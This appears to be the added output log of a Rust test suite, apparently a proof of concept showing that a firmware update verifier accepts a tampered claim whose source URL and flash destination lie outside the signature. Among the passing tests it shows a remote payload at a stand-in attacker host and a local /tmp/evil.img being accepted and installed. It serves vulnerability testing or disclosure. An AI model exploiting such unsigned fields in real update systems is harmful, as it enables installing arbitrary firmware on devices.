@@ -1,0 +1,17 @@
+running 3 tests
+[local] claim pointing at /tmp/evil.img accepted
+[baseline] honest claim accepted
+test local_file_source_is_accepted_too ... ok
+test legitimate_claim_is_accepted ... ok
+
+=== tampered claim ACCEPTED with a valid, unforged signature ===
+  signed manifest hash : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+  unsigned source hash : b6f0c98b42d02b948ed61387716b123165aab0cf1eecd6e8fd0d27ae8da2aed8
+  unsigned source url  : Remote(Url { scheme: "https", cannot_be_a_base: false, username: "", password: None, host: Some(Domain("attacker.example")), port: None, path: "/pwn.img", query: None, fragment: None })
+  unsigned destination : Raw(Raw { device: Qspi, offset: 0, size: 1024, redundancy: Single })
+  => arbitrary payload installed to an arbitrary offset
+
+test tampered_claim_with_untouched_signature_is_still_accepted ... ok
+
+test result: ok. 3 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.03s
+
